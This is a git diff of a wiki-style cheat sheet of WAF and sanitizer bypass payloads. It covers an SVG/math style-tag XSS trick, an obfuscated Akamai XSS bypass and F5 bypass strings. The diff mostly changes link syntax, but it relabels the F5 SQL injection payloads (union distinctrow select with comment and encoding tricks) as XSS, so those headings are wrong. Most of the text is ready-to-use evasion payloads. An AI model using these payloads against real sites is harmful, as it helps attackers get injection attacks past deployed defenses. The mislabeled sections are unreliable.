@@ -1,13 +1,13 @@
 # General
 
-Hide [[XSS]] payload in style tag of an SVG or math element for WAF or sanitizer bypass:
+Hide [[content/Web/Payloads/XSS|XSS]] payload in style tag of an SVG or math element for WAF or sanitizer bypass:
 
 ```
 <svg><style> <script>alert(1)</script> </style></svg> <math><style> <img src onerror=alert(2)> </style></math>
 ```
 # Akamai
 
-[[XSS]] bypass 1:
+[[content/Web/Payloads/XSS|XSS]] bypass 1:
 
 ```
 1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
@@ -28,14 +28,14 @@ Hide [[XSS]] payload in style tag of an SVG or math element for WAF or sanitizer
 
 # F5
 
-[[SQLi]] bypass 1:
+[[XSS]] bypass 1:
 
 ```
 +{`nothing`/*str*/(')}div%0B1+'
 +{`nothing`/*str*/(')}div%0B0+'
 ```
 
-[[SQLi]] bypass 2:
+[[XSS]] bypass 2:
 
 ```
 {`noth`/*ing*/821}+union+%23%0a+distinctrow%0b/**/select+1,2,3--{`nothing`/**/TRUE}
